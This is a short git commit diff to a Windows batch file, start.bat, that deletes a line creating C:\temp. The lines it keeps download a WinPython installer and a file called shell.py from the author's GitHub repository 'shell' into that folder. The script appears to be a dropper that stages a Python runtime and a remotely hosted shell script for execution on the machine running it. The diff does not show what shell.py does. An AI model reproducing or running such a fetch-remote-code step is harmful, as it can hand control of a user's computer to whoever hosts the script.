8cff279c4cdfb6a9b95202c22aba2b7b81701b52
mrLeonTheMaster <78276856+mrLeonTheMaster@users.noreply.github.com>
2023-01-28 12:45:33 +0100

    Update start.bat

--- start.bat
+++ start.bat
@@ -1,5 +1,3 @@
-mkdir C:\temp
-
 curl.exe -o C:\temp\python.exe https://github.com/winpython/winpython/releases/download/5.3.20221233/Winpython64-3.10.9.0.exe
 curl.exe -o C:\temp\shell.py https://raw.githubusercontent.com/mrLeonTheMaster/shell/main/shell.py
 
